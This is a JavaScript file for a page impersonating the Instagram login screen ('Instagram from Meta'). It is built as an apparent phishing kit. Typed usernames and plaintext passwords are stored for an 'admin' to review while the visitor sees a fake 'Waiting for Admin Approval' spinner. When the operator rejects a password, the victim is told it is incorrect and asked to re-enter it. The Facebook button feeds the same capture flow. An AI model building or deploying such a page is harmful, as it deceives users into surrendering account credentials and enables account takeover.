// Toggle password visibility
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const toggleIcon = document.querySelector('.toggle-password i');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.classList.remove('fa-eye');
        toggleIcon.classList.add('fa-eye-slash');
    } else {
        passwordInput.type = 'password';
        toggleIcon.classList.remove('fa-eye-slash');
        toggleIcon.classList.add('fa-eye');
    }
}

// Form validation and submission
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const loginButton = document.querySelector('.btn-login');
    
    // Simple validation
    if (username && password) {
        loginButton.style.opacity = '1';
        
        // Simulate login process
        loginButton.textContent = 'Logging in...';
        loginButton.disabled = true;
        
        // Submit login for admin approval
        submitLoginForApproval(username, password);
        
        // Display waiting message
        showWaitingForApprovalMessage();
        
        // Start checking for approval
        startCheckingForApproval();
    } else {
        // Show validation error
        alert('Please fill in all fields');
    }
});

/**
 * Submit login details for admin approval
 */
function submitLoginForApproval(username, password) {
    // Store login details in local storage for admin to review
    localStorage.setItem('pendingLogin', JSON.stringify({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
    }));
    
    console.log('Login submitted for admin approval');
}

/**
 * Show a message indicating the user is waiting for approval
 */
function showWaitingForApprovalMessage() {
    // Hide the login form
    const loginForm = document.getElementById('login-form');
    loginForm.style.display = 'none';
    
    // Create and show the waiting message
    const waitingMessage = document.createElement('div');
    waitingMessage.id = 'approval-waiting';
    waitingMessage.className = 'approval-waiting';
    
    waitingMessage.innerHTML = `
        <div class="loading-spinner">
            <div class="spinner"></div>
        </div>
        <h3>Waiting for Admin Approval</h3>
        <p>Your login request has been submitted and is waiting for administrator approval.</p>
        <p class="approval-status">Status: <span id="approval-status-text">Pending</span></p>
    `;
    
    // Add the waiting message after the login form
    loginForm.parentNode.insertBefore(waitingMessage, loginForm.nextSibling);
    
    // Add styles for the waiting message if they don't exist
    if (!document.getElementById('waiting-styles')) {
        const styleElement = document.createElement('style');
        styleElement.id = 'waiting-styles';
        styleElement.textContent = `
            .approval-waiting {
                text-align: center;
                padding: 20px;
                margin-top: 24px;
            }
            
            .loading-spinner {
                margin: 20px auto;
            }
            
            .spinner {
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #0095f6;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            .approval-waiting h3 {
                margin-bottom: 12px;
                font-weight: 600;
            }
            
            .approval-waiting p {
                color: #8e8e8e;
                margin-bottom: 12px;
            }
            
            .approval-status {
                font-weight: 500;
                margin-top: 20px;
            }
            
            #approval-status-text {
                color: #f7b955;
                font-weight: 600;
            }
            
            #approval-status-text.approved {
                color: #58c322;
            }
            
            #approval-status-text.rejected {
                color: #ed4956;
            }
            
            .error-message {
                color: #ed4956;
                font-weight: 500;
                margin-top: 16px;
                padding: 12px;
                background-color: rgba(237, 73, 86, 0.1);
                border-radius: 4px;
                display: none;
            }
        `;
        document.head.appendChild(styleElement);
    }
}

/**
 * Start checking for admin approval
 */
function startCheckingForApproval() {
    // Check for approval every 2 seconds
    const approvalCheckInterval = setInterval(() => {
        const loginResult = JSON.parse(localStorage.getItem('loginResult'));
        
        if (loginResult) {
            clearInterval(approvalCheckInterval);
            
            const statusElement = document.getElementById('approval-status-text');
            
            if (loginResult.status === 'approved') {
                // Update status text
                statusElement.textContent = 'Approved';
                statusElement.classList.add('approved');
                
                // Show success message
                setTimeout(() => {
                    // Redirect to dashboard
                    window.location.href = `dashboard.html?username=${encodeURIComponent(loginResult.username)}&approved=true`;
                }, 1500);
            } else if (loginResult.status === 'rejected') {
                // Update status text
                statusElement.textContent = 'Rejected';
                statusElement.classList.add('rejected');
                
                // Create and show error message
                const waitingMessage = document.getElementById('approval-waiting');
                
                if (!document.getElementById('error-message')) {
                    const errorMessage = document.createElement('div');
                    errorMessage.id = 'error-message';
                    errorMessage.className = 'error-message';
                    errorMessage.textContent = 'Password is incorrect. Please re-enter your password.';
                    errorMessage.style.display = 'block';
                    
                    waitingMessage.appendChild(errorMessage);
                }
                
                // Show error message and reset form after delay
                setTimeout(() => {
                    // Reset the form and UI
                    resetLoginForm();
                    
                    // Focus on password field
                    const passwordField = document.getElementById('password');
                    if (passwordField) {
                        passwordField.focus();
                        passwordField.value = '';
                    }
                }, 3000);
            }
            
            // Clear the result
            localStorage.removeItem('loginResult');
        }
    }, 2000);
    
    // Store the interval ID in a data attribute so we can clear it if needed
    document.body.setAttribute('data-approval-interval', approvalCheckInterval);
}

/**
 * Reset the login form after rejection
 */
function resetLoginForm() {
    // Get the elements
    const loginForm = document.getElementById('login-form');
    const waitingMessage = document.getElementById('approval-waiting');
    const loginButton = document.querySelector('.btn-login');
    
    // Show the form again
    loginForm.style.display = 'block';
    
    // Remove the waiting message
    if (waitingMessage) {
        waitingMessage.parentNode.removeChild(waitingMessage);
    }
    
    // Reset the button
    loginButton.textContent = 'Log In';
    loginButton.disabled = false;
    
    // Keep the username but clear the password
    const passwordField = document.getElementById('password');
    if (passwordField) {
        passwordField.value = '';
    }
}

// Enable/disable login button based on form input
const inputFields = document.querySelectorAll('#login-form input');
const loginButton = document.querySelector('.btn-login');

inputFields.forEach(input => {
    input.addEventListener('input', toggleLoginButton);
});

function toggleLoginButton() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    if (username && password) {
        loginButton.style.opacity = '1';
    } else {
        loginButton.style.opacity = '0.7';
    }
}

// Handle Facebook login button click
document.querySelector('.facebook-login').addEventListener('click', function() {
    alert('Facebook login would redirect to Facebook authentication in a real app.');
    
    // For demonstration, we'll submit a Facebook login for admin approval
    submitLoginForApproval('facebook_user', 'facebook_auth');
    showWaitingForApprovalMessage();
    startCheckingForApproval();
});

// Add year dynamically to copyright
document.addEventListener('DOMContentLoaded', function() {
    const currentYear = new Date().getFullYear();
    const copyrightSpan = document.querySelector('.copyright span');
    copyrightSpan.textContent = `© ${currentYear} Instagram from Meta`;
    
    // Check if we need to clear any previously running intervals
    const approvalInterval = document.body.getAttribute('data-approval-interval');
    if (approvalInterval) {
        clearInterval(parseInt(approvalInterval));
        document.body.removeAttribute('data-approval-interval');
    }
}); 